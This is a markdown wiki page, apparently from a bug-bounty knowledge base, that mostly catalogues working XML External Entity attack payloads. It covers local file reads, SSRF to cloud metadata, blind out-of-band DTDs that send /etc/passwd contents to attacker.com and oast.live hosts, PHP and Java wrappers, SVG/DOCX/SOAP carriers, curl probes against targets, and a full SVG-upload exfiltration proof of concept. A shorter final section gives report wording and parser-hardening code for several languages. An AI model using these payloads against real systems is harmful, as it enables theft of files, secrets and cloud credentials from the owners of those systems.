---
type: wiki
category: attack
tool: xxeinjector,burp,manual
status: active
last-updated: 2026-04-21
---

# XXE Deep Dive (2026 Edition)

> **Purpose:** XML External Entity is still P1-P2 in 2026 (reading secrets / SSRF / RCE via Java jar://). Most frameworks disable DTDs by default, but you still hit it often on legacy Java systems, SOAP, PDF-to-XML conversion, SVG/DOCX/EPUB/XLSX/SAML import, and XML-RPC.

## 0. Attack Surface

```
Content-Type: application/xml         → direct XXE
text/xml                              → same as above
application/soap+xml                  → SOAP services
image/svg+xml                         → SVG upload (later parsed server-side)
application/vnd.openxmlformats...     → DOCX/XLSX (contains xml internally)
application/epub+zip                  → EPUB
application/x-xliff+xml               → translation files
application/rss+xml / atom+xml        → RSS reader
multipart/form-data (containing xml)  → file upload
```

## 1. Basic XXE

### 1.1 Read local file

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

### 1.2 SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >
]>
<foo>&xxe;</foo>
```

See [66-ssrf-deep.md](66-ssrf-deep.md).

### 1.3 DTD blocked → use XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Some servers block DTDs but leave XInclude enabled.

## 2. Blind XXE

When the server does not reflect the response:

### 2.1 Out-of-Band (OOB) via external DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

```xml
<!-- evil.dtd on attacker.com -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 2.2 Parameter Entity exfil (full chain)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo/>
```

```xml
<!-- evil.dtd -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%data;'>">
%eval;
%exfil;
```

### 2.3 Error-based (when no OOB channel is available)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo/>
```

The error message will contain the content of `%file;` → read it from the error output.

## 3. Java-Specific Techniques

### 3.1 jar:// wrapper (file read + temp file)

```xml
<!ENTITY % xxe SYSTEM "jar:http://attacker/evil.jar!/file">
```

When triggered, Java downloads evil.jar to the temp dir → can be combined with another bug to read the temp file.

### 3.2 netdoc:// (absolute path)

```xml
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">
```

### 3.3 ftp:// exfiltration

```xml
<!ENTITY xxe SYSTEM "ftp://attacker.com/file">
```

### 3.4 XXE to RCE (requires a specific library)

```xml
<!-- Old Apache Commons Configuration + XXE → can load .class -->
<!ENTITY xxe SYSTEM "file:///WEB-INF/lib/">
```

Most XXE-to-RCE cases are actually a chain (XXE reads config → config has creds → obtain credentials → log in and act) rather than direct RCE.

## 4. PHP-Specific Techniques

### 4.1 PHP wrapper

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

Reads PHP source code (base64 encoding lets binary content bypass XML well-formedness checks).

### 4.2 expect:// wrapper (requires the expect extension)

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

Almost never installed, but worth trying.

### 4.3 data:// wrapper

```xml
<!ENTITY xxe SYSTEM "data://text/plain;base64,PHBocCBzeXN0ZW0oJ2lkJyk7Pz4=">
```

## 5. SVG / DOCX / EPUB XXE

### 5.1 SVG upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

If the server converts the SVG to another format or generates a thumbnail after upload → XXE triggers.

### 5.2 DOCX (XML inside a ZIP)

```bash
unzip -o x.docx -d docx/
# edit word/document.xml to inject XXE
# re-zip
cd docx && zip -r ../evil.docx .
```

### 5.3 XLSX/PPTX work the same way

### 5.4 EPUB

EPUB is a ZIP + XML directory structure, same approach.

## 6. SOAP XXE

```xml
POST /soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="...">
  <soap:Body>
    <GetUser>
      <id>&xxe;</id>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

## 7. XML-RPC / Disguising as a REST API

### 7.1 Force Content-Type: xml

If the endpoint accepts JSON, try switching to XML:

```bash
# Original
Content-Type: application/json
{"id":1}

# Changed
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><id>&xxe;</id></root>
```

Some frameworks (Spring RestTemplate + MessageConverter) will automatically parse the XML and bind it.

### 7.2 WSDL / SOAP endpoint discovery

```bash
# Classic
/service?wsdl
/soap?wsdl
/api/soap
/ws
```

## 8. Detection

### 8.1 Basic probe

```bash
# Against any XML-related endpoint
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc.oast.live/xxe">]><foo>&xxe;</foo>'

# interactsh callback → XXE confirmed
```

### 8.2 XInclude test

```bash
curl -X POST '...' -d '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://abc.oast.live/"/></foo>'
```

### 8.3 Common with PHP SimpleXML

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
```

## 9. Tools

### 9.1 XXEinjector

```bash
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb \
  --host=your.oast.live --httpport=8888 \
  --file=request.txt \
  --path=/etc/passwd --oob=http --verbose
```

Automates OOB + probing.

### 9.2 Burp XXE scanner (Pro)

Active scanner audit → XXE category.

### 9.3 Nuclei

```bash
nuclei -u https://target.com -tags xxe
```

### 9.4 Interactsh

```bash
interactsh-client -v
# get abc.oast.live → embed it as the ENTITY SYSTEM URL
```

## 10. Full PoC: SVG Upload → Blind XXE → /etc/passwd

### Step 1: Confirm the SVG is parsed

```bash
# upload a plain SVG
curl -F "file=@simple.svg" https://target.com/upload
# response contains "width/height" metadata → confirms server-side parsing
```

### Step 2: OOB detection

```xml
<!-- evil.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY % d SYSTEM "http://abc123.oast.live/d.dtd"> %d;]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>
```

```xml
<!-- attacker.com/d.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % go "<!ENTITY &#x25; send SYSTEM 'http://abc123.oast.live/x?d=%file;'>">
%go;
%send;
```

Upload evil.svg → check interactsh for the HTTP callback URL query `d=` → contains the /etc/passwd content, base64-safe.

### Step 3: Report

```markdown
## Vulnerability Summary
https://target.com/upload accepts SVG files and parses them with a Java XML
parser without disabling external entities. An attacker can craft a
malicious SVG to trigger a blind XXE and read arbitrary files via an
OOB channel.

## PoC
[evil.svg + evil.dtd + interactsh screenshot showing /etc/passwd]

## Impact
- Arbitrary file read (/etc/passwd, /WEB-INF/web.xml, /proc/self/environ)
- SSRF into the internal network (AWS IMDS)
- Combined with AWS IMDS → STS credentials → P1

## Severity
P2 (single XXE file read) / P1 (if chained to cloud metadata or app secrets)

## Remediation
1. Disable DTD / external entities in the XML parser:
   - Java: XMLInputFactory.setProperty("javax.xml.stream.supportDTD", false)
   - PHP: libxml_disable_entity_loader(true) / do not set LIBXML_NOENT
   - Python: use the defusedxml library
2. Rasterize (convert to PNG) uploaded SVGs before storing them
3. Strictly enforce Content-Type (if the API only accepts JSON, strictly reject xml)
```

## 11. Defense Checklist (by language)

### Java

```java
// JAXP
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### PHP

```php
// PHP 8+ libxml is secure by default, but still recommended:
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
// disable the entity loader
libxml_set_external_entity_loader(function(){ return null; });
```

### Python

```python
# Standard library is dangerous
from xml.etree import ElementTree  # vulnerable
# use instead
import defusedxml.ElementTree as ET
```

### .NET

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // .NET Framework 4.5.2+
settings.XmlResolver = null;
```

### Node.js

```js
// Most XML parsers are secure by default, but libxmljs / xmldom need it explicit:
const { DOMParser } = require('xmldom');
new DOMParser({
  errorHandler: { warning: () => {} },
  // xmldom 1.x has no entity loader; 2.x is secure by default
}).parseFromString(xml, 'text/xml');
```

### Generic

```
1. Disable DTD / entity loader
2. Whitelist Content-Type, reject xml if the API only uses JSON
3. If XML is required, validate with an XSD schema
4. Rasterize / normalize uploaded files
5. Egress firewall (block file://, block internal network http)
```

## Related Documents

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) — SVG / DOCX XXE via upload
- [66-ssrf-deep.md](66-ssrf-deep.md) — XXE → Cloud metadata SSRF
- [76-lfi-path-traversal.md](76-lfi-path-traversal.md) — PHP wrapper chaining
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- OWASP XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- XXEinjector: https://github.com/enjoiz/XXEinjector
